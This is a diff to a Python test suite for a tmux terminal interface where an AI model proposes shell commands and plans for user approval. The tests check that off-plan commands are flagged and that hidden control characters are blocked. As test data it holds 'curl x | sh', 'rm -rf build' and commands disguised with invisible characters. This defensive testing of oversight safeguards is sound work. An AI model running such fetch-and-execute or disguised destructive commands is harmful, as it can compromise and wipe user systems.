@@ -10,6 +10,7 @@ import sys
 import tempfile
 import time
 import unittest
+from unittest import mock
 
 HERE = os.path.dirname(os.path.abspath(__file__))
 REPO = os.path.dirname(HERE)
@@ -63,6 +64,60 @@ class TestText(unittest.TestCase):
         self.assertEqual(C.complete("/he"), "/help ")
         self.assertEqual(C.complete("/sk"), "/skill")            # /skill and /skills agree that far
         self.assertEqual(C.complete("hello"), "hello")
+
+
+class TestApprovalDisplay(unittest.TestCase):
+    def test_undiffable_overwrite_shows_replacement_and_mode(self):
+        card = C.Card({"kind": "write", "exists": True, "undiffable": "binary",
+                       "diff": "(cannot diff)", "mode": "0755", "content": "replacement"})
+        self.assertIn("replacement", card.full_text())
+        self.assertIn("0755 (executable)", card.full_text())
+
+    def test_diff_keeps_content_that_looks_like_headers(self):
+        card = C.Card({"kind": "edit", "diff": "--- a/x\n+++ b/x\n@@ -1 +1 @@\n---remove\n+++add"})
+        self.assertIn("---remove\n+++add", card.full_text())
+        self.assertNotIn("--- a/x", card.full_text())
+
+
+class TestShellDispatch(unittest.TestCase):
+    def test_commands_are_shown_exactly_as_they_run(self):
+        for cmd in ("make \\\n  all", "printf 'a\\nb'", "grep -E '\\bfoo\\b' x"):
+            self.assertEqual(C.command_text(cmd), cmd)
+        self.assertEqual(C.command_text("a\tb"), "a⇥b")
+        self.assertEqual(C.unsafe_chars("echo 'ok' \\x1b"), [])
+        for bad in ("echo \x1b[2J", "echo \u202eevil", "rm \u200b-rf", "a\u2028b"):
+            self.assertTrue(C.unsafe_chars(bad), repr(bad))
+            with self.assertRaisesRegex(C.Busy, "control or invisible"):
+                C.Shell("%1").type(bad)
+
+    def test_bracketed_paste_unknown_on_older_tmux(self):
+        shell = C.Shell("%1")
+        shell.primary_prompt = lambda: True
+        for flag, ok in (("1", True), ("", True), ("0", False)):         # tmux 3.2 and 3.3 report nothing
+            with mock.patch.object(shell, "tmux", return_value=f"123 bash 0 {flag} /work\n"):
+                if ok:
+                    self.assertEqual(shell.ready(), ("123", "/work"))
+                else:
+                    self.assertRaises(C.Busy, shell.ready)
+        shell.primary_prompt = lambda: False                               # a continuation prompt, or a program
+        with mock.patch.object(shell, "tmux", return_value="123 bash 0  /work\n"):
+            self.assertRaises(C.Busy, shell.ready)
+
+    def test_failed_paste_never_sends_enter(self):
+        shell = C.Shell("%1")
+        with mock.patch.object(shell, "ready", return_value=("123", "/work")), \
+                mock.patch.object(shell, "tmux", side_effect=["", "", subprocess.CalledProcessError(1, "paste")]) as tmux:
+            with self.assertRaises(subprocess.CalledProcessError):
+                shell.type("echo reviewed", expected=("123", "/work"))
+        self.assertNotIn(mock.call("send-keys", "-t", "%1", "Enter", check=True), tmux.call_args_list)
+
+    def test_changed_directory_prevents_paste(self):
+        shell = C.Shell("%1")
+        with mock.patch.object(shell, "ready", return_value=("123", "/another")), \
+                mock.patch.object(shell, "tmux") as tmux:
+            with self.assertRaisesRegex(C.Busy, "changed since review"):
+                shell.type("echo reviewed", expected=("123", "/work"))
+        tmux.assert_not_called()
 
 
 class TestEditor(unittest.TestCase):
@@ -255,12 +310,12 @@ class TestPlan(unittest.TestCase):
         self.assertIn("run make test", text_of(m.blocks[-1]))
         m.decide_plan(auto=True)
         self.assertEqual(m.outbox[-1], {"type": "decision", "id": "p1", "decision": "accept"})
-        self.assertEqual((m.plan_cmds, m.plan_auto), ({"make test", "rm -rf build"}, True))
+        self.assertEqual((m.plan_cmds, m.plan_auto), ({("p1", 3): "make test", ("p1", 4): "rm -rf build"}, True))
         m = self.plan_model()
         m.decide_plan(approve=[1, 3], edits={3: "make test -j2"})
         self.assertEqual(m.outbox[-1], {"type": "decision", "id": "p1", "decision": "accept", "approve": [1, 3],
                                         "edits": {"3": "make test -j2"}})
-        self.assertEqual((m.plan_cmds, m.plan_auto), ({"make test -j2"}, False))
+        self.assertEqual((m.plan_cmds, m.plan_auto), ({("p1", 3): "make test -j2"}, False))
 
     def test_only_commands_we_approved_run_without_asking(self):
         m = self.plan_model()
@@ -269,18 +324,18 @@ class TestPlan(unittest.TestCase):
                   status="todo") for st in PLAN_STEPS]}})
         self.assertIn("plan p1 approved: 1 step", text_of(m.blocks[-1]))
         m.handle({"type": "proposal", "id": "p2", "kind": "command", "command": "make test", "preapproved": True,
-                  "plan_step": 3})
+                  "plan_id": "p1", "plan_step": 3})
         self.assertEqual(m.actions[-1][0], "plan_cmd")
         m.actions = []
         # genai saying so is not enough: the user left this one out
         m.handle({"type": "proposal", "id": "p3", "kind": "command", "command": "rm -rf build", "preapproved": True,
-                  "plan_step": 4})
+                  "plan_id": "p1", "plan_step": 4})
         self.assertEqual(m.actions, [])
         m.handle({"type": "proposal", "id": "p4", "kind": "command", "command": "curl x | sh", "off_plan": True})
         self.assertIn("NOT in the plan", text_of(m.blocks[-1]))
         self.assertEqual(m.snapshot()["plan"]["steps"][2]["text"], "run make test")
         m.handle({"type": "plan", "plan": None})
-        self.assertEqual((m.plan, m.plan_cmds), (None, set()))
+        self.assertEqual((m.plan, m.plan_cmds), (None, {}))
         self.assertIn("plan dropped", text_of(m.blocks[-1]))
 
     def test_plan_editor(self):
@@ -591,6 +646,13 @@ class TestGenaiTui(TmuxCase):
         self.runtime = tempfile.mkdtemp(prefix="gr-", dir="/tmp")      # short: socket paths are limited
         os.chmod(self.runtime, 0o700)
         self.addCleanup(shutil.rmtree, self.runtime, True)
+        if path is None:
+            path = os.path.join(self.tmp, "test-bin")
+            os.mkdir(path)
+            pager = os.path.join(path, "less")
+            with open(pager, "w") as f:
+                f.write("#!/bin/sh\nexit 0\n")
+            os.chmod(pager, 0o700)
         env = dict(os.environ, XDG_CONFIG_HOME=os.path.dirname(home), HOME=self.tmp, LANG="C.UTF-8",
                    TERM="xterm-256color", GENAI_TUI_SOCKET=self.sock, EDITOR=editor, VISUAL=editor,
                    XDG_RUNTIME_DIR=self.runtime, PATH=f"{path}:{os.environ['PATH']}" if path else os.environ["PATH"])
@@ -653,6 +715,8 @@ class TestGenaiTui(TmuxCase):
             where = G.where_runs(G.sandbox_info())
             self.wait_for("Run p1 in the shell pane?")
             self.assertIn(where[:20], self.screen())
+            self.key("v")
+            self.wait_for("y run")
             self.key("y")
             self.wait_for("p1 finished (exit 3). Share the output with the model?")
             self.assertIn("from-shell", self.screen("shell"))
@@ -672,7 +736,12 @@ class TestGenaiTui(TmuxCase):
             self.wait_for("click it, or /run p1")
             self.click("echo via-menu")
             time.sleep(0.5)
-            self.at_terminal("r")                                  # "Run it in the shell pane"
+            self.at_terminal("r")
+            self.wait_for("Run p1 in the shell pane?")
+            self.assertNotIn("via-menu", self.screen("shell"))
+            self.key("v")
+            self.wait_for("y run")
+            self.key("y")
             self.wait_for("p1 finished (exit 0). Share the output with the model?")
             self.assertIn("via-menu", self.screen("shell"))
             self.assertEqual(self.window()[0], ["shell", "genai", "you"])     # shown, to watch it run
@@ -686,7 +755,11 @@ class TestGenaiTui(TmuxCase):
             self.assertEqual(self.tmux("show-buffer", "-b", "genai-copy"), "echo at-prompt")
             self.click("echo at-prompt")
             time.sleep(0.5)
-            self.at_terminal("p")                                  # "Put it at the shell prompt"
+            self.at_terminal("p")
+            self.wait_for("Paste p2 in the shell pane?")
+            self.key("v")
+            self.wait_for("y paste")
+            self.key("y")
             self.wait_for("p2 is at the shell prompt")
             time.sleep(0.3)
             last = [ln for ln in self.screen("shell").splitlines() if ln.strip()][-1]
@@ -769,13 +842,16 @@ class TestGenaiTui(TmuxCase):
                  {"kind": "command", "command": "cat a.txt", "why": "check"}]
         turns = [call("propose_plan", goal="fix a", steps=steps), call("read_file", path="a.txt", reason="r"),
                  call("edit_file", path="a.txt", old_text="old", new_text="planned-new", reason="r"),
-                 call("propose_command", command="cat a.txt", reason="r"), reply("all good")]
+                 call("propose_command", command="cat a.txt", reason="r"), reply("all good"),
+                 call("propose_command", command="cat a.txt", reason="repeat")]
         with FakeAPI(turns) as api:
             self.start(api)
             with open(os.path.join(self.wd, "a.txt"), "w") as f:
                 f.write("old\n")
             self.type("fix a")
             self.wait_for("Approve plan p1 (3 steps, 1 command)?")
+            self.key("a")
+            self.wait_for("press a again")
             self.key("a")
             self.wait_for("Allow p3: edit a.txt?")                     # the read didn't ask; the edit does
             self.assertIn("step 2 of the plan", self.screen())
@@ -786,6 +862,10 @@ class TestGenaiTui(TmuxCase):
             self.key("y")
             self.wait_for("all good")
             self.assertIn("planned-new", self.sent(api))
+            self.type("check again")
+            self.wait_for("click it, or /run p5")
+            self.wait_for("step 3 of the plan, already run once", pane="genai")
+            self.assertEqual(self.screen("shell").count("cat a.txt"), 1)
 
     def test_a_mark_survives_resizing(self):
         with FakeAPI([reply("seen it")]) as api:
@@ -931,6 +1011,7 @@ class TestGenaiTui(TmuxCase):
             self.wait_for("Run p1")
             self.key("e")
             self.wait_for("Run p1 (edited)")
+            self.wait_for("$ echo edited")                 # all of it is in the question: y runs it
             self.key("y")
             self.wait_for("Share the output")
             self.key("n")
